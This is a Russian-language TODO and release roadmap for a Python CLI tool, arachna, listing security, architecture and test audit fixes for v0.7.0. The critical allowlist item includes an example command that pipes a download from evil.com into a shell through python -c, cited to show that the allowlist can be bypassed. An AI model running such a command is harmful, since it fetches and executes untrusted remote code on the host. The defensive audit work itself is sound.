# TODO

## Текущий цикл — 2026-05-27, источник: аудит v0.7.0 pre-release

### [CRITICAL] src/arachna/runner.py — убрать интерпретаторы из _ALLOWED_COMMANDS
- [x] Источник: Безопасность / CRITICAL + Аудит RCE
- Версия: v0.7.0
- Суть: _ALLOWED_COMMANDS содержит python, node, ruby, perl, php. Каждый из них выполняет произвольный код: python -c "import os; os.system('curl evil.com | sh')". Блокировка _BLOCKED_PATTERNS тривиально обходится. Это имитация безопасности.
- Решение: убрать 5 интерпретаторов из allowlist. Оставить строго read-only утилиты: git log, tree, cat, grep, find, ls, wc, sort, uniq, head, tail, cut, tr, sed, awk, date, env, pwd, diff. Интерпретаторы — только через --allow-scripts с явным подтверждением.

### [HIGH] src/arachna/splitter.py — splitter игнорирует кастомный токенизатор (production-баг)
- [x] Источник: Архитектура / HIGH + Аудит H-01
- Версия: v0.7.0
- Суть: splitter.py импортирует count_tokens напрямую из tokenizer.py — всегда дефолтный 4 chars/token. gatherer.py использует глобальный _TOKENIZE (можно заменить через set_tokenizer). При кастомном токенизаторе сбор секций считает токены точно, а разбивка на части — грубо. Части превышают max_tokens.
- Решение: пробросить tokenizer параметром в split(), _build_parts(), _handle_single(). Временно использовать get_tokenizer() из gatherer до полного рефакторинга _TOKENIZE.
- Путь бага: config → tokenizer="tiktoken:cl100k_base" → collector.set_tokenizer() → gatherer._TOKENIZE(section) ✓ → splitter.count_tokens(section) ✗

### [HIGH] src/arachna/gatherer.py — устранить глобальное состояние _TOKENIZE
- Источник: Архитектура / HIGH + Аудит H-02 + M-02 (из v0.5.0)
- Версия: v0.7.0
- Суть: set_tokenizer() меняет модульную переменную _TOKENIZE — глобальный сайд-эффект. Тесты вынуждены патчить. Как библиотека — несколько вызовов с разными токенизаторами мешают друг другу. _collect_named_sections — God function на 47 строк (pre_commands + директории + files).
- Решение: dependency injection — передавать tokenizer параметром в _collect_named_sections, gather_files, dry_run, split. _TOKENIZE оставить deprecated для обратной совместимости. Декомпозировать _collect_named_sections на _collect_pre_commands, _scan_directories, _collect_specific_files.

### [HIGH] src/arachna/__main__.py — рефакторинг _cmd_all и _cmd_single (не завершён)
- Источник: Архитектура / HIGH + Аудит H-03
- Версия: v0.7.0
- Суть: _cmd_all (строки 171-204) и _cmd_single (строки 207-218) — дублирование логики get_profile → compress → format → collect. _cmd_all не поддерживает --incremental. В TODO v0.7.0 задача помечена [x], но код не изменён.
- Решение: вынести общую логику в _run_profile() (уже существует, но не используется для объединения). _cmd_all должен итерировать профили через _run_profile, _cmd_single — вызывать один раз. Поддержать --incremental в обоих случаях.

### [HIGH] src/arachna/collector.py — атомарная запись манифеста
- Источник: Архитектура / HIGH + Аудит H-04
- Версия: v0.7.0
- Суть: save_manifest (строка 40) делает write_text без атомарности — краш оставит повреждённый JSON. _cmd_single делает clean_manifest → collect → save_manifest без блокировок. В отличие от cache.py, где атомарная запись реализована правильно.
- Решение: реализовать save_manifest через tempfile + os.replace (как в save_cache). Для блокировок рассмотреть filelock при параллельных запусках.

### [MEDIUM] src/arachna/splitter.py — вынести CHARS_PER_TOKEN и добавить флаг truncated
- Источник: Архитектура / LOW + MEDIUM + Аудит M-03
- Версия: v0.7.0
- Суть: _handle_single использует max_chars = max_tokens * 4 — магическая константа, неявно связанная с tokenizer.py. При кастомном токенизаторе усечение некорректно. Нет информации о потере данных — вызывающий код не знает что контент обрезан.
- Решение: вынести CHARS_PER_TOKEN = 4 в tokenizer.py. В _handle_single пробросить tokenizer и использовать его для усечения. Возвращать (text, was_truncated, original_tokens) или добавить маркер truncated с информацией о потерянных токенах.

### [MEDIUM] src/arachna/config.py — унифицировать EXCLUDED_DIRS с gitignore.py
- Источник: Архитектура / LOW + Аудит L-01
- Версия: v0.7.0
- Суть: DEFAULT_EXCLUDE (config.py) и EXCLUDED_DIRS (gitignore.py) содержат пересекающиеся списки: venv, node_modules, __pycache__. При добавлении новой директории нужно править два файла.
- Решение: вынести общий список в config.py как EXCLUDED_DIRS, импортировать в gitignore.py. Обновить оба модуля.

### [MEDIUM] src/arachna/renderer.py — вынести магические значения в константы
- Источник: Архитектура / LOW + Аудит L-02
- Версия: v0.7.0
- Суть: порог 0.05 для <0.1%, строка "<0.1%" — магические значения без документирующих комментариев.
- Решение: MIN_PCT_THRESHOLD = 0.05, MIN_PCT_DISPLAY = "<0.1%" с комментариями.

### [HIGH] tests/ — замена os.chdir на tmp_path/monkeypatch
- Источник: Тестопригодность / HIGH + Аудит H-05
- Версия: v0.7.0
- Суть: 90% тестов делают os.chdir(tmpdir) — глобальное состояние процесса, pytest-xdist не работает. Тесты gatherer патчат pathlib.Path.cwd поверх os.chdir — избыточно. 180+ тестов идут последовательно.
- Решение: перевести все тесты на tmp_path (pytest fixture) + monkeypatch.chdir. Удалить двойное патчение cwd. Тесты tokenizer изолировать от sys.path.

### [MEDIUM] tests/runner/test_run_command.py — замокать subprocess.run
- Источник: Тестопригодность / MEDIUM + Аудит M-05
- Версия: v0.7.0
- Суть: тесты вызывают echo — работает на Unix, падает на Windows. Системные вызовы в unit-тестах.
- Решение: замокать subprocess.run во всех тестах runner. Системные вызовы вынести в интеграционные тесты.

### [MEDIUM] tests/config/test_get_profile.py — изоляция от родительского .arachna.json
- Источник: Тестопригодность / MEDIUM + Аудит M-06
- Версия: v0.7.0
- Суть: тесты ищут конфиг через find_config(), поднимаясь по дереву директорий. Если у разработчика есть .arachna.json в домашней директории — тесты упадут.
- Решение: monkeypatch для подмены find_config или cwd на временную директорию.

### Отложено
- src/arachna/completion.py — heredoc-тесты на shell-совместимость: требует запуска в реальной оболочке, не блокирует v0.7.0
- src/arachna/runner.py — sandbox (контейнер/nsjail): требует product-решения до v1.0.0
- src/arachna/collector.py — filelock для параллельных запусков: маловероятный сценарий для CLI, отложить до интеграции в CI/CD

---

## v0.1.0 — MVP
- [x] tokenizer, config, collector, gatherer, splitter, formatter, runner, CLI

## v0.1.1 — Tests + fixes
- [x] 29 tests

## v0.1.2 — Dry-run & Developer Experience
- [x] dry_run, renderer, Makefile, pre-commit

## v0.1.3 — Validate & Gitignore
- [x] validator, gitignore, default profile

## v0.1.4 — Tests & Bugfixes
- [x] 102 tests, 65% coverage

## v0.1.5 — Shebang Detection
- [x] shebang detection, 107 tests

## v0.2.0 — Single file output, manifest, test reorg
- [x] chat-code.md, manifest, arachna_context/, 129 tests, 90% coverage

## v0.2.1 — arachna init
- [x] --init interactive + --defaults auto-detect

## v0.2.2 — Git split marker, per-profile manifest cleanup
- [x] \n=== COMMIT: marker, --profile keeps other profiles

## v0.3.0 — Compress, incremental, formats, binary
- [x] compress, incremental, section_format, include_binary, 140 tests

## v0.4.0 — Shell completion + hooks
- [x] bash/zsh completion, post_commands, 144 tests

## v0.4.1 — Table of contents + manifest
- [x] TOC in each part, chat-manifest.md

## v0.4.2 — Audit fixes
- [x] Removed dead code, fixed CJK tests, README token margin

## v0.5.0 — Tests, safety, audit, tokenizer prep
- [x] Removed compress_indent (unsafe), safe compression only
- [x] Shell security warning, LICENSE, pyproject.toml classifiers
- [x] formatter: verbose skip reasons
- [x] splitter: separator for xml/json
- [x] Tests: cache, completion, init, formatter, incremental, manifest
- [x] 175 tests, 90% coverage

## v0.6.0 — Pluggable tokenizer (ВЫПУЩЕН, НО С БАГОМ)
- [x] load_tokenizer(spec) в tokenizer.py
- [x] tokenizer field в profile
- [x] Plumbed через collector → gatherer
- [x] BUG: splitter напрямую импортирует count_tokens, игнорируя кастомный токенизатор
- [x] 179 tests, 90% coverage

## v0.7.0 — Архитектура, безопасность, тестопригодность (текущий)
- [x] runner.py: убрать интерпретаторы из allowlist
- [x] splitter.py: пробросить токенизатор в split()
- [ ] gatherer.py: убрать глобальный _TOKENIZE, DI
- [ ] __main__.py: рефакторинг _cmd_all/_cmd_single
- [ ] collector.py: атомарная запись манифеста
- [ ] splitter.py: CHARS_PER_TOKEN + флаг truncated
- [ ] config.py: унифицировать EXCLUDED_DIRS
- [ ] renderer.py: константы MIN_PCT_*
- [ ] tests/: tmp_path + monkeypatch
- [ ] tests/runner/: замокать subprocess.run

## v1.0.0 — Public release
- [ ] pip install arachna (publish to PyPI)
- [ ] Sandbox для command (контейнер/nsjail или dry-run + подтверждение)
- [ ] Кроссплатформенные тесты (Windows CI)
- [ ] arachna install-hook (git post-commit)
- [ ] Coverage ≥ 95%

## Backlog
- [ ] CI/CD (GitHub Actions)
- [ ] Интеграция в IDE (VS Code extension)
- [ ] Web UI для визуального редактора профилей
